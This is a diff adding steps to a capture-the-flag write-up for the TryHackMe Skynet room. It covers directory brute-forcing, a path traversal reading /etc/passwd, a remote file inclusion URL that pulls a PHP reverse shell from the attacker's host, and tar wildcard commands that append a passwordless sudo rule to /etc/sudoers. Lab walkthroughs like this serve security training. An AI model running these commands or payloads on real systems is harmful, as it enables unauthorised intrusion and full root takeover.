@@ -74,3 +74,47 @@ this is Poc writeup CTF skynet from TryHackMe.com, link https://tryhackme.com/ro
 
 ![webview](/submit/22.png "webview")
 
+13. use gobuster for brute the directory. in this case i'm using dirb wordlist and got the CMS pannel on http://**your target**/**the directory**/Administrator/ :
+
+![gobuster](/submit/23.png "gobuster")
+
+![webview](/submit/24.png "webview")
+
+14. then use searchsploit to get the information. there is Local/Remote vuln on file alertConfigField.php. in this case, just add ../../../../../../etc/passwd on url browser and the /etc/passwd information show off :
+
+![searchsploit](/submit/25.png "searchsploit")
+
+![cat](/submit/26.png "cat")
+
+![webview](/submit/27.png "webview")
+
+15. creat reverse shell in PHP than run the simple http server using python3 for upload the PHP reverse shell script to the target machine afterthat use ncat for listener. then open the browser and type http://**your target**/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://**local machine**/reverse.php, now we got the shell :
+
+![nano](/submit/28.png "nano")
+
+![ncat](/submit/29.png "ncat")
+
+![reverseShell](/submit/30.png "reverseShell")
+
+![reverseShell](/submit/31.png "reverseShell")
+
+16. go into desktop directory milesdyson and there is user.txt, use cat for show the output :
+
+
+
+17. check crontab file to get information, which service runing by **root**. there's backup.sh that will be run on /var/www/html/ approximately every one minutes. copy backup.sh into /var/www/html then run the several comment bellow :
+- **echo 'echo "www-data ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > sudo.sh **
+- **touch "/var/www/html/--checkpoint-action=exec=sh sudo.sh"**
+- **touch "/var/www/html/--checkpoint=1"**
+
+![reverseShell](/submit/36.png "reverseShell")
+
+![previlegeescall](/submit/37.png "previlegeescall")
+
+![previlegeescall](/submit/38.png "previlegeescall")
+
+18. BOOM we got the root access. now go into **/root** and cat the root.txt
+
+![previlegeescall](/submit/39.png "previlegeescall")
+
+73 good luck
